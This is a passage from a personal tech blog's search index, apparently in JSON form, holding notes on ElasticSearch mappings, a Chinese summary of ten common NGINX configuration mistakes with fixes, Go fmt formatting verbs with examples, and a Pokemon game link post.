style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;mappings\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;properties\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;content\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;analyzer\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ik_max_word\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;search_analyzer\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ik_smart\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;age\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;integer\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;index\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;acknowledged\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;shards_acknowledged\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;index\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;words\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Docker","ELK","ElasticSearch","Kibana"],"title":"ElasticSearch 学习笔记"},{"categories":["URL","Pokemon","Arceus","Game"],"contents":" 《宝可梦：阿尔宙斯》双周目通关 ","date":"September 19, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220919-pokemon-legends-arceus-stage-clear/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://soulteary.com/2022/09/05/pokemon-legends-arceus-stage-clear.html\" target=\"_blank\" rel=\"noopener\"\u003e《宝可梦：阿尔宙斯》双周目通关\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Pokemon","Arceus","Game"],"title":"《宝可梦：阿尔宙斯》双周目通关"},{"categories":["URL","NGINX"],"contents":" Avoiding the Top 10 NGINX Configuration Mistakes - NGINX 1) 每個 worker 的檔案描述元（FD）不夠 問題點 worker_connections 只限制 單一 worker 可同時開啟的連線數（預設 512）。 但每個連線/檔案/暫存檔/日誌都會消耗 檔案描述元（FD），而 OS 預設每個 process 常見是 1024。 常見錯誤：只調大 worker_connections，卻沒有同步提高 FD 限制，導致 worker 提早耗盡 FD。 修正方式 在 main context 設定 worker_rlimit_nofile，至少為 worker_connections 的 2 倍（經驗值）。 同時確認系統總 FD 上限 fs.file-max 足夠： worker_rlimit_nofile * worker_processes 要明顯小於 fs.file-max。 # main context worker_connections 1024; # 在 events {} 內 worker_rlimit_nofile 2048; # 在 main context 補充 NGINX 當 proxy 時：client 連線 1 FD + upstream 連線 1 FD，可能還需要暫存檔 1 FD。 若被 DoS 打滿 FD，甚至可能無法登入機器處置，因此要預留系統餘裕。 2) error_log off 其實沒有關閉 error log 問題點 error_log 不支援 off 參數。 寫成 error_log off; 會讓 NGINX 產生一個名為 off 的檔案（通常在 /etc/nginx/）。 修正方式（不建議真的關閉） 若真的必須停寫 error log（例如磁碟極度有限），改導到 /dev/null 並限制等級： # main context error_log /dev/null emerg; 補充 這條生效前，NGINX 啟動/ reload 驗證設定的過程仍可能先寫到預設路徑（常見 /var/log/nginx/error.log）。 可用啟動參數 nginx -e \u0026lt;error_log_location\u0026gt; 指定啟動階段的 error log 位置。 3) 沒有對 upstream 啟用 keepalive（導致連線/來源埠耗盡） 問題點 預設：NGINX 對 upstream 每個 request 都新建連線，連線建立/關閉都有成本。 高流量時會放大 OS 資源消耗；且連線關閉後會進入 TIME-WAIT，可能導致 來源埠（ephemeral ports）耗盡，進而無法建立新連線。 修正方式 (A) 在每個 upstream {} 內加 keepalive\n參數代表：每個 worker 保留在快取中的 idle keepalive 連線數（不是總連線上限）。 建議值：大約為 upstream server 數量的 2 倍。 upstream backend { # 若有 load balancing 演算法（hash/ip_hash/least_conn/least_time/random） # 要寫在 keepalive 之前（少數需要排序的例外） least_conn; server 10.0.0.11:8080; server 10.0.0.12:8080; keepalive 4; # ~ 2 * servers } (B) 在 location {} 轉發處，確保上游使用 HTTP/1.1 且移除 Connection: close\nlocation / { proxy_pass http://backend; proxy_http_version 1.1; proxy_set_header Connection \u0026#34;\u0026#34;; } 4) 忘記 directive 的繼承/覆寫規則（尤其是「陣列型」指令） 規則重點 NGINX 指令 由外到內繼承（parent → child）。 但當 child context 也出現同一 directive 時：child 會覆寫 parent，而不是累加。 尤其容易踩雷：add_header、proxy_set_header 這類可以重複出現的「陣列型」指令。 範例（重點：location 一旦宣告 add_header，就會覆寫上層所有 add_header） http { add_header X-HTTP-LEVEL-HEADER 1; add_header X-ANOTHER-HTTP-LEVEL-HEADER 1; server { listen 8081; add_header X-SERVER-LEVEL-HEADER 1; location /test { add_header X-LOCATION-LEVEL-HEADER 1; return 200 \u0026#34;OK\u0026#34;; } location /correct { # 必須把上層想保留的 header 全部在這裡重宣告 add_header X-HTTP-LEVEL-HEADER 1; add_header X-ANOTHER-HTTP-LEVEL-HEADER 1; add_header X-SERVER-LEVEL-HEADER 1; add_header X-LOCATION-LEVEL-HEADER 1; return 200 \u0026#34;OK\u0026#34;; } } } 5) 濫用 proxy_buffering off（效能下降、功能失效） 問題點 預設：proxy_buffering on（開啟代理緩衝）。 關閉後：NGINX 只先緩衝很小一段（通常只夠 header），後續會「同步」把 upstream 回應一段段轉給慢速 client，迫使 upstream 等待，整體吞吐下降。 副作用：即使你有設定，快取與限速等功能也可能無法正常運作（文章強烈不建議改預設）。 建議 除非是少數情境（例如長輪詢/即時串流等），否則不要關。 # 不建議： proxy_buffering off; # 建議保留預設： proxy_buffering on; 6) 在 location 裡不當使用 if（容易踩坑） 問題點 if 在 NGINX 設定中很「危險」，常見行為與直覺不一致，甚至可能造成崩潰（社群常稱 \u0026ldquo;If is Evil\u0026rdquo;）。 一般安全用法：if { return ... } 或 if { rewrite ... }。 範例：用 if + error_page 做分流（相對安全） location / { error_page 430 = @error_430; if ($http_x_test) { return 430; } proxy_pass http://a; } location @error_430 { proxy_pass http://b; } 更推薦：用 map 取代 if（更乾淨、可維護） map $http_x_test $upstream_name { default \u0026#34;b\u0026#34;; \u0026#34;\u0026#34; \u0026#34;a\u0026#34;; } location / { proxy_pass http://$upstream_name; } 7) 健康檢查（health check）配置過量（對 upstream 造成額外壓力） 問題點 多個 server {} 都 proxy_pass 到同一個 upstream {} 時，如果每個 server {} 都放一次 health_check，會造成 重複探測、增加 upstream 負載，但資訊並不更完整。 修正方式 每個 upstream group 只定義 一套 health check，集中管理（例如放在 named location 或集中到一個監控用的 server）。 location / { proxy_set_header Host $host; proxy_set_header Connection \u0026#34;\u0026#34;; proxy_http_version 1.1; proxy_pass http://b; } location @health_check { health_check; proxy_connect_timeout 2s; proxy_read_timeout 3s; proxy_set_header Host example.com; proxy_pass http://b; } 延伸（集中健康檢查 + API/dashboard） server { listen 8080; location @health_check_b { health_check; proxy_connect_timeout 2s; proxy_read_timeout 3s; proxy_set_header Host example.com; proxy_pass http://b; } location /api { api write=on; # NGINX Plus # 需限制存取（見 #8） } location = /dashboard.html { root /usr/share/nginx/html; } } 8) 指標（metrics）未加保護（資訊可能被用於攻擊） 問題點 stub_status（Open Source）或 api（NGINX Plus）暴露的資訊可能敏感。 常見錯誤：直接對外公開 URL。 修正方式一：HTTP Basic Auth location = /basic_status { auth_basic \u0026#34;closed site\u0026#34;; auth_basic_user_file conf.d/.htpasswd; stub_status; } 修正方式二：allow/deny 限制來源 IP location = /basic_status { allow 192.168.1.0/24; allow 10.1.1.0/16; allow 2001:0db8::/32; allow 96.1.2.23/32; deny all; stub_status; } 組合：satisfy any（白名單 IP 免登入，其餘需登入） location = /basic_status { satisfy any; auth_basic \u0026#34;closed site\u0026#34;; auth_basic_user_file conf.d/.htpasswd; allow 192.168.1.0/24; allow 10.1.1.0/16; allow 2001:0db8::/32; allow 96.1.2.23/32; deny all; stub_status; } 9) ip_hash 用錯情境：所有流量看起來都來自同一個 /24 問題點 ip_hash 的 key 是 IPv4 的前三個 octets（/24）或整個 IPv6。 如果 NGINX 前面有防火牆、L4 LB、gateway 等設備，且它們都在同一個 /24，NGINX 看到的來源 IP（remote addr）就會落在同一 /24，導致 hash key 全相同 → 流量無法分散。 修正方式 改用 hash $binary_remote_addr，以完整位址（binary）做 key。 consistent（ketama）可降低 server 變動時的重映射比例，提升快取命中率。 upstream backend { hash $binary_remote_addr consistent; server 10.10.20.105:8080; server 10.10.20.106:8080; server 10.10.20.108:8080; } 10) 沒有善用 upstream group（即使只有一台後端也值得） 常見錯誤 直接在 proxy_pass 寫死 host:port，覺得只有一台不需要 upstream {}。 但 upstream group 可解鎖更好的連線管理、健康判定、容錯策略等。 建議做法（示例） upstream node_backend { zone upstreams 64K; # shared memory server 127.0.0.1:3000 max_fails=1 fail_timeout=2s; keepalive 2; } server { listen 80; server_name example.com; location / { proxy_set_header Host $host; proxy_pass http://node_backend/; proxy_next_upstream error timeout http_500; } } 補充 zone：讓多個 worker 共享 upstream 狀態；NGINX Plus 也可搭配 API 動態調整 upstream（不需重啟）。 server ... max_fails/fail_timeout：更精準控制「不健康」判定。 proxy_next_upstream：定義哪些錯誤要切到下一台（例：http_500 也視為失敗）。 ","date":"September 16, 2022","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220916-avoiding-top-10-nginx-configuration-mistakes/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.nginx.com/blog/avoiding-top-10-nginx-configuration-mistakes/\" target=\"_blank\" rel=\"noopener\"\u003eAvoiding the Top 10 NGINX Configuration Mistakes - NGINX\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"1-每個-worker-的檔案描述元fd不夠\"\u003e1) 每個 worker 的檔案描述元（FD）不夠\u003c/h2\u003e\n\u003ch3 id=\"問題點\"\u003e問題點\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eworker_connections\u003c/code\u003e 只限制 \u003cstrong\u003e單一 worker 可同時開啟的連線數\u003c/strong\u003e（預設 512）。\u003c/li\u003e\n\u003cli\u003e但每個連線/檔案/暫存檔/日誌都會消耗 \u003cstrong\u003e檔案描述元（FD）\u003c/strong\u003e，而 OS 預設每個 process 常見是 1024。\u003c/li\u003e\n\u003cli\u003e常見錯誤：只調大 \u003ccode\u003eworker_connections\u003c/code\u003e，卻沒有同步提高 FD 限制，導致 worker 提早耗盡 FD。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"修正方式\"\u003e修正方式\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e在 \u003cstrong\u003emain context\u003c/strong\u003e 設定 \u003ccode\u003eworker_rlimit_nofile\u003c/code\u003e，至少為 \u003ccode\u003eworker_connections\u003c/code\u003e 的 2 倍（經驗值）。\u003c/li\u003e\n\u003cli\u003e同時確認系統總 FD 上限 \u003ccode\u003efs.file-max\u003c/code\u003e 足夠：\n\u003ccode\u003eworker_rlimit_nofile * worker_processes\u003c/code\u003e 要明顯小於 \u003ccode\u003efs.file-max\u003c/code\u003e。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# main context\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_connections\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e;         \u003cspan style=\"color:#75715e\"\u003e# 在 events {} 內\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_rlimit_nofile\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2048\u003c/span\u003e;        \u003cspan style=\"color:#75715e\"\u003e# 在 main context\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"補充\"\u003e補充\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eNGINX 當 proxy 時：client 連線 1 FD + upstream 連線 1 FD，可能還需要暫存檔 1 FD。\u003c/li\u003e\n\u003cli\u003e若被 DoS 打滿 FD，甚至可能無法登入機器處置，因此要預留系統餘裕。\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"2-error_log-off-其實沒有關閉-error-log\"\u003e2) \u003ccode\u003eerror_log off\u003c/code\u003e 其實沒有關閉 error log\u003c/h2\u003e\n\u003ch3 id=\"問題點-1\"\u003e問題點\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eerror_log\u003c/code\u003e \u003cstrong\u003e不支援\u003c/strong\u003e \u003ccode\u003eoff\u003c/code\u003e 參數。\u003c/li\u003e\n\u003cli\u003e寫成 \u003ccode\u003eerror_log off;\u003c/code\u003e 會讓 NGINX 產生一個名為 \u003ccode\u003eoff\u003c/code\u003e 的檔案（通常在 \u003ccode\u003e/etc/nginx/\u003c/code\u003e）。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"修正方式不建議真的關閉\"\u003e修正方式（不建議真的關閉）\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e若真的必須停寫 error log（例如磁碟極度有限），改導到 \u003ccode\u003e/dev/null\u003c/code\u003e 並限制等級：\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# main context\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eerror_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/dev/null\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eemerg\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"補充-1\"\u003e補充\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e這條生效前，NGINX 啟動/ reload 驗證設定的過程仍可能先寫到預設路徑（常見 \u003ccode\u003e/var/log/nginx/error.log\u003c/code\u003e）。\u003c/li\u003e\n\u003cli\u003e可用啟動參數 \u003ccode\u003enginx -e \u0026lt;error_log_location\u0026gt;\u003c/code\u003e 指定啟動階段的 error log 位置。\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"3-沒有對-upstream-啟用-keepalive導致連線來源埠耗盡\"\u003e3) 沒有對 upstream 啟用 keepalive（導致連線/來源埠耗盡）\u003c/h2\u003e\n\u003ch3 id=\"問題點-2\"\u003e問題點\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e預設：NGINX 對 upstream \u003cstrong\u003e每個 request 都新建連線\u003c/strong\u003e，連線建立/關閉都有成本。\u003c/li\u003e\n\u003cli\u003e高流量時會放大 OS 資源消耗；且連線關閉後會進入 \u003ccode\u003eTIME-WAIT\u003c/code\u003e，可能導致 \u003cstrong\u003e來源埠（ephemeral ports）耗盡\u003c/strong\u003e，進而無法建立新連線。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"修正方式-1\"\u003e修正方式\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e(A) 在每個 \u003ccode\u003eupstream {}\u003c/code\u003e 內加 \u003ccode\u003ekeepalive\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e","tags":["URL","NGINX"],"title":"Avoiding the Top 10 NGINX Configuration Mistakes - NGINX"},{"categories":["URL","Go"],"contents":" Go string format Go 语言 fmt.Printf 使用指南 The verb at the end defines the type and the interpretation of its corresponding argument.\nd - decimal integer o - octal integer O - octal integer with 0o prefix b - binary integer x - hexadecimal integer lowercase X - hexadecimal integer uppercase f - decimal floating point, lowercase F - decimal floating point, uppercase e - scientific notation (mantissa/exponent), lowercase E - scientific notation (mantissa/exponent), uppercase g - the shortest representation of %e or %f G - the shortest representation of %E or %F c - a character represented by the corresponding Unicode code point q - a quoted character U - Unicode escape sequence t - the word true or false s - a string v - default format #v - Go-syntax representation of the value T - a Go-syntax representation of the type of the value p - pointer address % - a double %% prints a single % Go string format indexing package main import ( \u0026#34;fmt\u0026#34; ) func main() { n1 := 2 n2 := 3 n3 := 4 res := fmt.Sprintf(\u0026#34;There are %d oranges %d apples %d plums\u0026#34;, n1, n2, n3) fmt.Println(res) // There are 2 oranges 3 apples 4 plums res2 := fmt.Sprintf(\u0026#34;There are %[2]d oranges %d apples %[1]d plums\u0026#34;, n1, n2, n3) fmt.Println(res2) // There are 3 oranges 4 apples 2 plums } Go string format precision package main import ( \u0026#34;fmt\u0026#34; ) func main() { fmt.Printf(\u0026#34;%0.f\\n\u0026#34;, 16.540) // 17 fmt.Printf(\u0026#34;%0.2f\\n\u0026#34;, 16.540) // 16.54 fmt.Printf(\u0026#34;%0.3f\\n\u0026#34;, 16.540) // 16.540 fmt.Printf(\u0026#34;%0.5f\\n\u0026#34;, 16.540) // 16.54000 } Go string format flags package main import ( \u0026#34;fmt\u0026#34; ) func main() { fmt.Printf(\u0026#34;%+d\\n\u0026#34;, 1691) // +1691 fmt.Printf(\u0026#34;%#x\\n\u0026#34;, 1691) // 0x69b fmt.Printf(\u0026#34;%#X\\n\u0026#34;, 1691) // 0X69B fmt.Printf(\u0026#34;%#b\\n\u0026#34;, 1691) // 0b11010011011 fmt.Printf(\u0026#34;%10d\\n\u0026#34;, 1691) // 1691 fmt.Printf(\u0026#34;%-10d\\n\u0026#34;, 1691) // 1691 fmt.Printf(\u0026#34;%010d\\n\u0026#34;, 1691) // 0000001691 } Go string format width package main import ( \u0026#34;fmt\u0026#34; ) func main() { w := \u0026#34;falcon\u0026#34; n := 122 h := 455.67 fmt.Printf(\u0026#34;%s\\n\u0026#34;, w) // falcon fmt.Printf(\u0026#34;%10s\\n\u0026#34;, w) // falcon fmt.Printf(\u0026#34;%d\\n\u0026#34;, n). // 122 fmt.Printf(\u0026#34;%7d\\n\u0026#34;, n) // 122 fmt.Printf(\u0026#34;%07d\\n\u0026#34;, n) // 0000122 fmt.Printf(\u0026#34;%10f\\n\u0026#34;, h) // 455.670000 fmt.Printf(\u0026#34;%11f\\n\u0026#34;, h) // 455.670000 fmt.Printf(\u0026#34;%12f\\n\u0026#34;, h) // 455.670000 } ","date":"September 8, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220908-string-format/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://zetcode.com/golang/string-format/\" target=\"_blank\" rel=\"noopener\"\u003eGo string format\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.liwenzhou.com/posts/Go/fmt/\" target=\"_blank\" rel=\"noopener\"\u003eGo 语言 fmt.Printf 使用指南\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe verb at the end defines the type and the interpretation of its corresponding argument.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ed\u003c/code\u003e - decimal integer\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eo\u003c/code\u003e - octal integer\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eO\u003c/code\u003e - octal integer with \u003ccode\u003e0o\u003c/code\u003e prefix\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eb\u003c/code\u003e - binary integer\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ex\u003c/code\u003e - hexadecimal integer lowercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eX\u003c/code\u003e - hexadecimal integer uppercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ef\u003c/code\u003e - decimal floating point, lowercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eF\u003c/code\u003e - decimal floating point, uppercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ee\u003c/code\u003e - scientific notation (mantissa/exponent), lowercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eE\u003c/code\u003e - scientific notation (mantissa/exponent), uppercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eg\u003c/code\u003e - the shortest representation of \u003ccode\u003e%e\u003c/code\u003e or \u003ccode\u003e%f\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eG\u003c/code\u003e - the shortest representation of \u003ccode\u003e%E\u003c/code\u003e or \u003ccode\u003e%F\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ec\u003c/code\u003e - a character represented by the corresponding Unicode code point\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eq\u003c/code\u003e - a quoted character\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eU\u003c/code\u003e - Unicode escape sequence\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003et\u003c/code\u003e - the word true or false\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003es\u003c/code\u003e - a string\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ev\u003c/code\u003e - default format\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e#v\u003c/code\u003e - Go-syntax representation of the value\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eT\u003c/code\u003e - a Go-syntax representation of the type of the value\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ep\u003c/code\u003e - pointer address\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%\u003c/code\u003e - a double \u003ccode\u003e%%\u003c/code\u003e prints a single \u003ccode\u003e%\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"go-string-format-indexing\"\u003eGo string format indexing\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003en1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003en2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003en3\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;There are %d oranges %d apples %d plums\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en1\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en2\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en3\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// There are 2 oranges 3 apples 4 plums\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 